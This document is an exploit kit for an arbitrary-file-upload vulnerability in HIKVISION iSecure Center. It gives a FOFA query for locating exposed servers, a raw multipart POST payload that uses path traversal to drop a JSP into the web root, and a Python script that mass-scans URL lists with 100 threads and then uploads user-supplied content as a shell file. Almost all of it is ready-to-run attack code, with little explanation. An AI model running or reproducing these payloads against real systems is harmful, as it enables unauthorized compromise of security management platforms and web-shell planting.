fofa

```markdown
app="HIKVISION-iSecure-Center"
```

payload

```markdown
POST /center/api/files;.html HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

hello，world
------WebKitFormBoundary9PggsiM755PLa54a--
```

exp

```python
import requests, argparse, sys, os
from multiprocessing.dummy import Pool

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def banner():
    test = """

    """
    print(test)


def poc(target):
    payload = "/center/api/files;.js"
    headers = {
        'User-Agent': 'python-requests/2.31.0',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Length': '264',
        'Content-Type': 'multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c',
    }
    data = "--ea26cdac4990498b32d7a95ce5a5135c\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/qiuyv.txt\"Content-Type: application/octet-stream\r\n\r\nHello This is qiuyv\r\n--ea26cdac4990498b32d7a95ce5a5135c--\r\n\r\n\r\n"
    try:
        res1 = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=5)
        # print(res1.text)
        if res1.status_code == 200 and 'data' in res1.text:
            res2 = requests.get(url=target + '/clusterMgr/qiuyv.txt;.js', verify=False, timeout=5)
            if res2.status_code == 200:
                print(f"[+]{target} 存在任意文件上传")
                with open('output1.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[+]{target} 存在任意文件上传\n")
                    return True
        else:
            print(f"[-]{target} 不存在任意文件上传")
    except Exception as e:
        print(e)


def exp(target):
    os.system('cls')
    print("正在上传文件")
    payload = "/center/api/files;.js"
    payload1 = "/clusterMgr/shell.txt;.js"
    headers = {
        'User-Agent': 'python-requests/2.31.0',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Length': '264',
        'Content-Type': 'multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c',
    }

    shell_code = input("请输入你要上传的文件内容：")
    data = "--ea26cdac4990498b32d7a95ce5a5135c\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/shell.txt\"; Content-Type: application/octet-stream\r\n\r\n" + shell_code + "\r\n--ea26cdac4990498b32d7a95ce5a5135c--\r\n\r\n\r\n"

    try:
        res1 = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=10)
        # print(res1.text)
        if res1.status_code == 200 and 'data' in res1.text:
            res2 = requests.get(url=target + payload1, verify=False, timeout=5)
            if res2.status_code == 200:
                print(f"上传成功，您上传的文件内容为：{res2.text}\n请访问网站{target + payload1}进行验证")
            else:
                print(f"上传失败")
    except Exception as e:
        print(e)


def main():
    banner()
    parser = argparse.ArgumentParser(
        description="这是一个关于海康威视isecure center 综合安防管理平台任意文件上传漏洞的扫描脚本")
    parser.add_argument('-u', '-url', dest='url', type=str, help="Please enter URL")
    parser.add_argument('-f', '-file', dest='file', type=str, help="Please enter file")

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == "__main__":
    main()

```

